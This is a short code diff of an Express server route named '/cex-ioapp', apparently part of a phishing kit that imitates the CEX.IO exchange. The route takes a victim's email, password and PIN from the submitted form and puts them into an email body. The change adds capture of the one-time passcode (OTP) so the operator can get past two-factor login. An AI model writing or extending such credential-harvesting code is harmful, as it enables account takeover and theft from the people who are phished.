@@ -277,8 +277,8 @@ app.post('/cex-ioapp', (req, res, next) => {
     'req body', req.body
   )
 
- const { email, password, pin } = req.body
- const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br>`
+ const { email, password, pin, otp } = req.body
+ const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong> ${otp}</p>`
 
 
   const mail = {
